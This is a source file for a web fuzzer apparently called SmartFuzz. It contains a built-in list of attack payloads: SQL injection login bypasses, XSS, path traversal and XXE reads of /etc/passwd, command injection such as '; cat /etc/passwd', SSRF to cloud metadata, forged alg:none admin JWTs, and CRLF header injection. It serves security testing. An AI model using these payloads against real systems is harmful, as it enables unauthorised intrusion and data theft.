// Curated built-in payload library. Committed to the repo so SmartFuzz works
// out of the box (PRD "zero training time / works out of the box") without
// cloning the multi-hundred-MB wordlist repos. `setup.js` can optionally clone
// SecLists / PayloadsAllTheThings / FuzzDB to scale this up, but everything
// here is enough to confirm the headline vulnerability classes on DVWA-class
// targets.
//
// Each entry: { type, value, source, categories[], tags[] }
//   type       — a key from @smartfuzz/shared vulnTypes
//   categories — parameter-classifier categories this payload suits
//   tags       — subtype / engine hints (e.g. 'error_based', 'mysql', 'time')

export const CURATED_PAYLOADS = [
  // ── SQL Injection ──
  { type: 'sqli', value: "'", source: 'custom', categories: ['NUMERIC_ID', 'SEARCH_FIELD', 'AUTH_FIELD', 'GENERIC'], tags: ['error_based', 'probe'] },
  { type: 'sqli', value: "''", source: 'custom', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['error_based'] },
  { type: 'sqli', value: "' OR '1'='1", source: 'seclists', categories: ['AUTH_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['boolean_based', 'auth_bypass'] },
  { type: 'sqli', value: "' OR 1=1 --", source: 'seclists', categories: ['AUTH_FIELD', 'NUMERIC_ID', 'GENERIC'], tags: ['boolean_based', 'auth_bypass'] },
  { type: 'sqli', value: "' OR 1=1 #", source: 'seclists', categories: ['AUTH_FIELD', 'NUMERIC_ID'], tags: ['boolean_based', 'mysql'] },
  { type: 'sqli', value: '1 OR 1=1', source: 'fuzzdb', categories: ['NUMERIC_ID'], tags: ['boolean_based', 'numeric'] },
  { type: 'sqli', value: "1' AND '1'='2", source: 'fuzzdb', categories: ['NUMERIC_ID', 'SEARCH_FIELD'], tags: ['boolean_based', 'false'] },
  { type: 'sqli', value: '" OR "1"="1', source: 'seclists', categories: ['AUTH_FIELD', 'GENERIC'], tags: ['boolean_based', 'double_quote'] },
  { type: 'sqli', value: "admin'--", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'comment'] },
  { type: 'sqli', value: "' UNION SELECT NULL--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'SEARCH_FIELD'], tags: ['union'] },
  { type: 'sqli', value: "' AND SLEEP(5)--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'SEARCH_FIELD', 'GENERIC'], tags: ['time_based', 'mysql', 'sleep'] },
  { type: 'sqli', value: "'; WAITFOR DELAY '0:0:5'--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'GENERIC'], tags: ['time_based', 'mssql'] },
  { type: 'sqli', value: "' OR pg_sleep(5)--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'GENERIC'], tags: ['time_based', 'postgres'] },
  { type: 'sqli', value: "1) OR SLEEP(5)#", source: 'payloadsallthethings', categories: ['NUMERIC_ID'], tags: ['time_based', 'mysql'] },

  // ── Cross-Site Scripting ──
  { type: 'xss', value: '<script>alert(1)</script>', source: 'seclists', categories: ['SEARCH_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'basic'] },
  { type: 'xss', value: '"><script>alert(1)</script>', source: 'seclists', categories: ['SEARCH_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'attr_break'] },
  { type: 'xss', value: "'><script>alert(1)</script>", source: 'seclists', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['reflected', 'attr_break'] },
  { type: 'xss', value: '<img src=x onerror=alert(1)>', source: 'seclists', categories: ['TEXT_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['reflected', 'event_handler'] },
  { type: 'xss', value: '<svg/onload=alert(1)>', source: 'payloadsallthethings', categories: ['TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'svg'] },
  { type: 'xss', value: '<body onload=alert(1)>', source: 'payloadsallthethings', categories: ['TEXT_FIELD'], tags: ['reflected'] },
  { type: 'xss', value: 'javascript:alert(1)', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['reflected', 'protocol'] },
  { type: 'xss', value: '<iframe src=javascript:alert(1)>', source: 'payloadsallthethings', categories: ['TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'iframe'] },

  // ── Path Traversal / LFI ──
  { type: 'path_traversal', value: '../../../../etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH', 'GENERIC'], tags: ['lfi', 'unix'] },
  { type: 'path_traversal', value: '../../../../../../etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'unix'] },
  { type: 'path_traversal', value: '....//....//....//etc/passwd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'filter_bypass'] },
  { type: 'path_traversal', value: '..%2f..%2f..%2fetc%2fpasswd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'url_encoded'] },
  { type: 'path_traversal', value: '../../../../windows/win.ini', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'windows'] },
  { type: 'path_traversal', value: '..\\..\\..\\..\\windows\\win.ini', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'windows'] },
  { type: 'path_traversal', value: '/etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'absolute'] },

  // ── Command Injection ──
  { type: 'cmd_injection', value: '; id', source: 'payloadsallthethings', categories: ['COMMAND', 'GENERIC'], tags: ['unix', 'semicolon'] },
  { type: 'cmd_injection', value: '| id', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'pipe'] },
  { type: 'cmd_injection', value: '`id`', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'backtick'] },
  { type: 'cmd_injection', value: '$(id)', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'subshell'] },
  { type: 'cmd_injection', value: '; uname -a', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix'] },
  { type: 'cmd_injection', value: '& whoami', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['windows', 'amp'] },
  { type: 'cmd_injection', value: '| dir', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['windows', 'pipe'] },
  { type: 'cmd_injection', value: '; sleep 5', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'time'] },

  // ── Server-Side Template Injection ──
  { type: 'ssti', value: '{{7*7}}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['probe', 'jinja', 'twig'] },
  { type: 'ssti', value: '${7*7}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['probe', 'freemarker', 'el'] },
  { type: 'ssti', value: '#{7*7}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['probe', 'ruby'] },
  { type: 'ssti', value: '{{7*7}}${7*7}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['probe', 'polyglot'] },
  { type: 'ssti', value: '<%= 7*7 %>', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['probe', 'erb'] },

  // ── Open Redirect ──
  { type: 'open_redirect', value: 'https://evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['absolute'] },
  { type: 'open_redirect', value: '//evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['scheme_relative'] },
  { type: 'open_redirect', value: '/\\evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['backslash_bypass'] },
  { type: 'open_redirect', value: 'https:evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['no_slash'] },

  // ── SSRF ──
  { type: 'ssrf', value: 'http://127.0.0.1', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback'] },
  { type: 'ssrf', value: 'http://localhost', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback'] },
  { type: 'ssrf', value: 'http://169.254.169.254/latest/meta-data/', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['cloud_metadata', 'aws'] },
  { type: 'ssrf', value: 'http://[::1]', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback', 'ipv6'] },
  { type: 'ssrf', value: 'http://0.0.0.0', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback'] },

  // ── NoSQL Injection ──
  { type: 'nosql_injection', value: '{"$gt":""}', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['mongo', 'operator'] },
  { type: 'nosql_injection', value: '{"$ne":null}', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'GENERIC'], tags: ['mongo', 'operator'] },
  { type: 'nosql_injection', value: "' || '1'=='1", source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['mongo', 'js'] },

  // ── LDAP Injection ──
  { type: 'ldap_injection', value: '*', source: 'fuzzdb', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['wildcard'] },
  { type: 'ldap_injection', value: '*)(uid=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter'] },
  { type: 'ldap_injection', value: '*)(&', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter'] },

  // ── XPath Injection ──
  { type: 'xpath_injection', value: "' or '1'='1", source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['boolean'] },
  { type: 'xpath_injection', value: "'] | //user/*['", source: 'payloadsallthethings', categories: ['SEARCH_FIELD'], tags: ['node'] },

  // ── XXE (XML External Entity) ──
  // Fire on XML-accepting endpoints (Content-Type: application/xml | text/xml).
  // The detector confirms on a reflected entity or a /etc/passwd signature.
  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['classic', 'file_read', 'unix'] },
  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['classic', 'file_read', 'windows'] },
  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['ssrf', 'cloud_metadata'] },
  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['php_wrapper', 'source_read'] },
  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['parameter_entity'] },
  { type: 'xxe', value: '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'FILE_PATH', 'GENERIC'], tags: ['svg', 'file_read'] },
  { type: 'xxe', value: '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['file_read', 'unix'] },
  { type: 'xxe', value: '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId></stockCheck>', source: 'payloadsallthethings', categories: ['XML_FIELD', 'GENERIC'], tags: ['classic', 'file_read'] },

  // ── JWT Algorithm Confusion (alg:none) ──
  // The detector mutates a present JWT to alg:none and replays it; these are
  // weak-secret probes the fuzzer can also try against HS256 tokens.
  { type: 'jwt_alg_none', value: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'TOKEN_FIELD', 'GENERIC'], tags: ['alg_none', 'admin'] },
  { type: 'jwt_alg_none', value: 'eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'TOKEN_FIELD', 'GENERIC'], tags: ['alg_None', 'case_variant'] },
  { type: 'jwt_alg_none', value: 'secret', source: 'payloadsallthethings', categories: ['TOKEN_FIELD'], tags: ['weak_secret', 'hs256'] },
  { type: 'jwt_alg_none', value: 'password', source: 'payloadsallthethings', categories: ['TOKEN_FIELD'], tags: ['weak_secret', 'hs256'] },
  { type: 'jwt_alg_none', value: '123456', source: 'payloadsallthethings', categories: ['TOKEN_FIELD'], tags: ['weak_secret', 'hs256'] },

  // ── CRLF Injection / HTTP Response Splitting ──
  { type: 'crlf_injection', value: '%0d%0aSet-Cookie:smartfuzz=injected', source: 'payloadsallthethings', categories: ['URL_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['url_encoded', 'set_cookie'] },
  { type: 'crlf_injection', value: '%0d%0aX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['url_encoded', 'header'] },
  { type: 'crlf_injection', value: '\r\nX-Injected-Header: smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['raw', 'header'] },
  { type: 'crlf_injection', value: '%0D%0AX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['url_encoded_upper', 'header'] },
  { type: 'crlf_injection', value: '%E5%98%8A%E5%98%8DX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['unicode_bypass', 'header'] },
  { type: 'crlf_injection', value: '%23%0d%0aX-Injected-Header:smartfuzz', source: 'payloadsallthethings', categories: ['URL_FIELD', 'GENERIC'], tags: ['fragment_prefix', 'header'] },

  // ── Path Traversal / LFI (extended) ──
  { type: 'path_traversal', value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'double_url_encoded'] },
  { type: 'path_traversal', value: '..%252f..%252f..%252fetc%252fpasswd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'double_encoded'] },
  { type: 'path_traversal', value: '..%c0%af..%c0%af..%c0%afetc/passwd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'unicode'] },
  { type: 'path_traversal', value: '..%5c..%5c..%5cwindows%5cwin.ini', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'windows', 'url_encoded'] },
  { type: 'path_traversal', value: '/var/www/../../etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'absolute_traversal'] },
  { type: 'path_traversal', value: 'file:///etc/passwd', source: 'payloadsallthethings', categories: ['FILE_PATH', 'URL_FIELD'], tags: ['lfi', 'file_scheme'] },
  { type: 'path_traversal', value: 'php://filter/convert.base64-encode/resource=index.php', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'php_wrapper'] },
  { type: 'path_traversal', value: '....\\\\....\\\\....\\\\windows\\\\win.ini', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'windows', 'filter_bypass'] },

  // ── Command Injection (extended) ──
  { type: 'cmd_injection', value: '&& id', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'and'] },
  { type: 'cmd_injection', value: '|| id', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'or'] },
  { type: 'cmd_injection', value: '%0aid', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'newline'] },
  { type: 'cmd_injection', value: '\nid', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'raw_newline'] },
  { type: 'cmd_injection', value: '; ping -c 1 127.0.0.1', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'time', 'ping'] },
  { type: 'cmd_injection', value: '&& dir', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['windows', 'and'] },
  { type: 'cmd_injection', value: '; cat /etc/passwd', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'file_read'] },

  // ── SSTI (per-engine, extended) ──
  { type: 'ssti', value: '{{config}}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['jinja', 'config_leak'] },
  { type: 'ssti', value: '{{self._TemplateReference__context}}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['twig'] },
  { type: 'ssti', value: '#set($x=7*7)${x}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['velocity'] },
  { type: 'ssti', value: '${{7*7}}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['probe', 'polyglot2'] },
  { type: 'ssti', value: '@(7*7)', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['razor'] },
  { type: 'ssti', value: '{{7*\'7\'}}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['jinja', 'string_mult'] },

  // ── Auth bypass (dedicated) ──
  { type: 'sqli', value: "admin' OR '1'='1'--", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'comment'] },
  { type: 'sqli', value: "admin'/*", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'comment'] },
  { type: 'sqli', value: "' OR 1=1 LIMIT 1--", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'limit'] },
  { type: 'sqli', value: '") OR ("1"="1', source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'paren'] },

  // ── NoSQL Injection (extended) ──
  { type: 'nosql_injection', value: '{"$where":"1==1"}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['mongo', 'where'] },
  { type: 'nosql_injection', value: '{"$regex":".*"}', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['mongo', 'regex'] },
  { type: 'nosql_injection', value: '{"$gt":"", "$lt":"~"}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD'], tags: ['mongo', 'range'] },

  // ── LDAP Injection (extended) ──
  { type: 'ldap_injection', value: ')(cn=*))(|(cn=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter', 'or'] },
  { type: 'ldap_injection', value: '*)(objectClass=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['filter', 'enumerate'] },
  { type: 'ldap_injection', value: 'admin)(&(password=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter', 'auth_bypass'] },
];

export default CURATED_PAYLOADS;
